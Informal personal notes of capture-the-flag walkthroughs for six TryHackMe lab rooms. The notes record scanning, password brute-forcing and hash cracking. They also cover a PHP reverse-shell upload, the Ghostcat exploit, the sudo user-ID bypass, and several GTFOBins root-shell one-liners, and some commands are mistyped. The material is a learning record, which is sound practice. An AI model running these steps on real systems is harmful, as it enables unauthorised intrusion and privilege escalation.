Try HackMe--> https://tryhackme.com/dashboard

Pickle Rick [solved]
============
Launch Attacking machine in tryHackMe
enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.70.30 -oA nmap
	Found two services running 1) Openssh 7.2p2 2) running on 22 port, Apache 2.4.18 running on 80 port
	
	searched exploits for Openssh 7.2

	Below exploits did not work
	===============================================
	msf > use auxiliary/scanner/ssh/ssh_enumusers
	msf auxiliary(ssh_enumusers) > show actions
    	...actions...
	msf auxiliary(ssh_enumusers) > set ACTION < action-name >
	msf auxiliary(ssh_enumusers) > show options
    	...show and set options...
	msf auxiliary(ssh_enumusers) > run
	================================================

	Not tried this, need to try next time
	======================================================
	msf > use auxiliary/scanner/http/apache_optionsbleed
	msf auxiliary(apache_optionsbleed) > show actions
   	 ...actions...
	msf auxiliary(apache_optionsbleed) > set ACTION < action-name >
	msf auxiliary(apache_optionsbleed) > show options
    	...show and set options...
	msf auxiliary(apache_optionsbleed) > run
	========================================================

	Apache running on port 80, so open webserver on web browser--> nothing found in front page/UI
	view page source-> found username "RickRul3s
	open robots.txt-> found some random alphanumeric value   (guessing this as password)

	Next find sub directories , using DirBuster, Gobuster tools-- > Found login.php page exists
	-------------------------------------------
	dirb http://10.10.70.30 /usr/share/wordlist.txt
	-----------------------------------------
	Try login via browser-  http://10.10.70.30/login.php, -> username as we found during view page source and password guessed from Robots.txt
	Login success
	Found command input page in webserver, check which are OS commands working, E.g cat, ls, find, home,grep,less, pwd, head,tail
	Found that except pwd, ls, less remaining commands not working
	output of pwd-?/var/www/html
	output of ls-> found clue.txt, and Suser3* file
	try to see content of clue,txt using less command (cat command not working so) -> less clue.txt

	From the clue.txt  found string, to get ingredients navigate throught file systems
	Try seeing content of Suser3* file-> lss Suser3* file-> Found First ingredient

	search for home directory
	less /home-> Found Rick directory
	inside Rick directory (less /home/Rick) found 2nd ingredient)-> less /home/Rick/"second ingredients"
	
	//check for super user permission
	sudo -l   ---> Found (ALL) NOPASSWORD:ALL  ---> means any user can run any command without login required

	sudo file format as below
	[Any user] [any host]:[on behalf of any user] [any command]
	meaning of above is, any user on any host can run any command on behalf of any user

	search in root directory, to search in root directory normal user need super user permission, in sudo file format if permission given for execute any command y any user then
	sudo ls /root--> found 3rd.txt file
	contents of 3rd.txt file given 3rd ingredient ( sudo lss /root/3rd.txt

=====================================================================================================================
Boiler CTF

enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.100.67 -oA nmap
	ftp anon Anonymous login 
	ftp port 21 open vsftpd 3.0.3

	try ftp login as username Anonymous
		ftp 10.10.100.67
	After login success
	ftp>ls ---> to list file, does not see any files here
	
	search for hidden files
	ftp> ls -la--> found .info.txt
	
	Download  .info.text
	fp> get .info.txt

	ftp>exit

	>cat .info.txt--> found some encoded value
	Try decode using cyberchef website  https://gchq.github.io/CyberChef/
	

	//To find what service running on port 10000
	nmap -p100000 10.10.100.67

	10000/tcp http Minserve 1.930 (Webmin httpd)
	
	//To find exploitable
	google for any available exploits and also can search using searchsploit

	
	//find highest port and service

	//To find what CMS running on webserver
	use gobuster 
	>gobuster dir http://10.10.100.67/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 25

	//based on hint enumerate further
	>gobuster dir http://10.10.100.67/joomla/ -w /usr/share/dirb/wordlists/medium.txt -t 25

	During enumeration we get unusual files like , file starts with _, try ccess that path in browser, we get index page

	search on sar2html and also catthat file and see what we get information
	got credentials , try ssh
	ssh bastard@10.10.100.67 -p 5500 and enter password when prompt
	after login search for any interesting file-> .secret file-> cat this file-> get another user credentials
	ssh to second user account, and list files, get backup.sh file, cat it and get flag
	
	if any file has suid bit set and if any normal user executes that file , that normal user get inherits the suid property
	in linux find command searches all files from root level

	umask command in linux for assign permissions
	suid for directory is 4, files 2, sticky bit 0
	so find which file permission is set with suid--> find / -perm /4000 2>/dev/null
	 ( where 4000- 4 is to check which directory have set suid , 000 is file permission by default for files 666, drectory permission by default 777)

	/usr/bin/find  is having suid, othes are like false positive

	To become effective user, 1) run any command with /usr/bin/find  or 2) add current user as sudo 3) change file permission to 777
	> /usr/bin/find . -exec chmod -R 777 /root \; 
	>ls -al /root
	>cat root/root.txt----> get the flag

==============================================================================================================================
Cyborg 

	Nmap IP address
	visit website, view page source, search for any info- no interesting information
	Directory bruteforcing
	Got admin panel, found Alex is user, enumerate more on the website, got clues like squidfroxy, music-archive
	Download tar file t see whats inside
	in readme file from downloaded tar  has URL
	From dirbuster search found /amin and /etc folder
	Navigate to /etc from browser, found squid (which has hashed password ) /passwd,
	search $apr1$ in google- found like it  apache generated algorith password- MD5
	use hashcat to decrypt
	hashcat -h | grep apr1   --->  found that 1600
	hashcat -a 0 -m 1600 hash rockyou.txt --force   (where has is hash value we found and stored with file name as hash)-- got password as "squidward"
	Previously we gor URL from read me file, in that we have URL, navigate to that URL in browser
	from above URL, we see some installation steps of borgbackup, follow installation step provided in installation tab
	After installation , extract music-archive which e have unzipped earlier
	from linux machine search , borg -h and man borg- > found usage syntax -> borg extract /path/to/repo/:password
	>borg list /path/to/repo/:Music-archive-> found note.txt-> cat this file-> found Alex user credentials
	ssh to alex@ipaddess   -> enter password when prompt for
	After login found user.txt file which is a flag

	next step is get root access
	sudo -l  ( to find anything alex run with root privilizes) -> got /etc/mp3backups/backup.sh
	cd to /etc/mp3backups and cat backup.sh
	Found cmd=$command , c $command , we can execute command like >sudo backup.sh -c whoami -> shows as root
	//To make privilize escLtion
	>sudo backup.sh -c /bin/bash /   --> success of privilize escalation for /bin/bash
	After privilize escalation check for whether we became root user?
	>whoami  //not shown any output, may be working

	Another way to see content of root.txt as follows
	> cat root/root.txt /root/flag.txt   // to make loacl copy

	create suid to execute as root user to see content of root.txt
	>chmod 4577 /bin/bash     //giving root permission for /bin/bash to execute commands as root
	exit from current directory enter >exit
	
	//switch to bash 
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt

	cd /etc/mp3backups
	>ls

	repeat agin
	>chmod 4577 /bin/bash 
	
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt
	
	=====================================================================================
	RootMe
	
	visit website, view page source
	nmap -sC -sV -oN scan 10.10.104.71
	gobuster search -?  /upload  --> we can upload malicious file
	https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	from above link download php malicious filesave as pp5 , change IP address and port
	Then upload, if upload success
	
	bash
	>nc nvlp 1337 
	
	//click on uploaded malicious file over server/application and see u get reverse shell

	upgreade our shell
	search  How to get linux shell using python
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

	python -c 'import pty; pty.spawn("/bin/bash")'

	search for flag file
	find / type -f -name user.txt
	cat /var/www/user.txt    //got flag


	escalate user privilizes to get as root
	>find / type f -user root -perm 4000 2>/dev/null

	https://gtfobins.github.io/     //Priilege escalations docs  , type python  and select SUID
	will get below command 
	./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

	from find command we got /usr/bin/python   so modify above command as belo & run
	
	./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	then we get root permission

	cat root/root.txt

====================================================================================================
AgentSudo

	Nmap scan, port 80,21,22 ports are open
	visit website, view page source
	Do nikto scan
	Do gobuster scan to find subdirectories
	curl "http://10.10.173.151" -H "User-Agent:C" -L

	>hydra -l chris -p /path/to/rockyou.txt ftp:10.10.173.151
	foound credential chris/crystal

	>ftp 10.10.173.151  --> enter username & password- > Login success
	//download all files
	ftp>mget *
	cat the downloaded txt file to get clues
	
	//find anything is there in jpg files
	>strings*.jpg
	>strings*.png

	binwalk -e cute.png  //extract the files inside image
	navigate inside the extracted folder

	//unzip the zip files
	>unzip 8702.zip
	
	>7z e 8702.zip   //need password

	>/opt/jhonTheRipper/run/Zip2john 8702.zip    //we see some hash value
	>/opt/jhonTheRipper/run/Zip2john 8702.zip > hashes_for_john.txt
	>/opt/jhonTheRipper/run/john hashes_for_john.txt --wordlist=/opt/rockyou.txt   -> Found password

	>7z e 8702.zip  //enter password

	>cat To_agentR.txt   //to check any info , Found some encrypted value, its random Upper case alphabet, may be Base64
	>echo QXJlYTUx | base64 -d    -> found decrypted value
	
	>steghide extract -sf cute-alien.jpg   // enter password we got e from decrypted, after password enter got jpg file extracted

	>ls // Found some txt file, cat displayed password & user james

	//Try to ssh
	>ssh james@10.10.173.151   //enter password we found above -->login success
	james@ >ls //search for any flag files  --> found flag

	//from other terminal bash , where we downloaded files
	//search for any strings inside Alien_autospy.jpg
	>strings Alien_autospy.jpg   //not found any useful info
	>exiftool Alien_autospy.jpg //not found any useful info

	image base search in google

	scp-> secured copy protocol
	SCP Command Syntax--> scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2

	scp james@10.10.173.151:/Alien_autospy.jpg .
	>eog Alien_autospy.jpg  //opens image file
	
	>strings Alien_autospy.jpg  // to find anything interest info
	>exiftool Alien_autospy.jpg  // to find anything interest info

	Google image search   //upload this image and found some information about event

	//privilege-escalation-awesome-scripts-suite
	Download this linpeas.sh tool from   https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
	
	scp /opt/linpeas.sh james@10.10.173.151:/dev/shm
	
	james@agent-sudo:$ cd /dev/shm
	james@agent-sudo:/dev/shm$ls  //linpeas.sh
	
	$chmod +x linpeas.sh
	$./linpeas.sh

	$sshpass -p "hackerrles!" ssh james@10.10.173.151
	$sudo -l   //found (ALL, !root)  /bin/bash

	$ sudo -u#1 /bin/bash    //which buffer overflows and make privilege as root, here user id -1 does not exists
	After execute above command , switched to root@agent-sudo:# 
	root@agent-sudo:# ls  // found user_flag.txt
	
	root@agent-sudo:# cd /root
	root@agent-sudo:# ls  //root.txt
	root@agent-sudo:# /root#cat root.txt   //found flag



======================================================================================
 TomGhost
	nmap scan-> 
	22/tcp ssh
	53/tcp tcpwrapped
	8009/tcp ajp13 Apache Jserv v1.3
	8080/tcp http Apache Tomcat 9.0.30

	goto exploit db webpage and search tomcat , Found "Apache Tomcat - AJP 'Ghostcat File Read/Inclusion"
	
         copy code from https://www.exploit-db.com/exploits/48143 & save as python file
	and run -> python code.py <IP addr of webserver>   --> got credentials
	
	ssh with above credential
	ssh skyfuck@10.10.127.181   -> enter yes, then password -> login success
	skyfuck$ ls, Found credentials.pgp and 1 more file
	skyfuck$ cd /home/  -> merlin skyfuck    folders found
	>cd merlin/
	>ls  //found user.txt
	>cat user.txt --? got flag

	//lets do privilize escalation
	>sudo -l   , enter password when prompt //error user skyfuck may nt sudo on ubuntu

	skyfuck@ubuntu:/home/merlin$cd ~   //to navigate to main folder
	skyfuck@ubuntu:$ls
		creentials.pgp  tryhackme.asc

	skyfuck@ubuntu: python3 -m http-server     //started server to host our files, note down port number once started server for file browse

	browser-> 10.10.127.181:8000 --> download above 2 files

	we can download file using scp protocol
	>scp tryhackme.asc kali@IP address of attacker machine:/home/kali/tryhackme ( path to store)

	decrypt the pgp file
	>gpg --decrypt credentials.pgp    //failed error decryption failed: No secret key
	we need to find secret key to decrypt above file

	root@kali: gpg2john tryhackme.asc > tryhackme.hash    //hash file created

	root@kali:jhon tryhackme.hash --wordlist=/path/to/rockyou.txt    //found password

	try to import tryhackme.asc
	>gpg import tryhackme.asc-> asked for passphrase enter above password we got recently

	//Now try decrypt
	>gpg --decrypt credentials.pgp   //asked for passphrase enter above password we got recently
	decrypt successful and we got password for merlin user

	try login merlin as su
	skyfuck@ubuntu: su merlin  //enter password we got from above step --> SUCCESS
	merlin@ubuntu:/home/skyfuck$ sudo -l   //(root:root) NOPASSWD: /usr/bin/zip
	
	GTFOBins site, search for ZIP  suid 
	https://gtfobins.github.io/gtfobins/zip/
		
	It can be used to break out from restricted environments by spawning an interactive system shell.

	//enter below commands on by one
	TF=$(mktemp -u)
	zip $TF /etc/hosts -T -TT 'sh #'
	rm $TF

	After enter above commands check we got as root
	>whoami   //shown root
	
	>cat /root/root.txt   //Found flag

======================================================================================





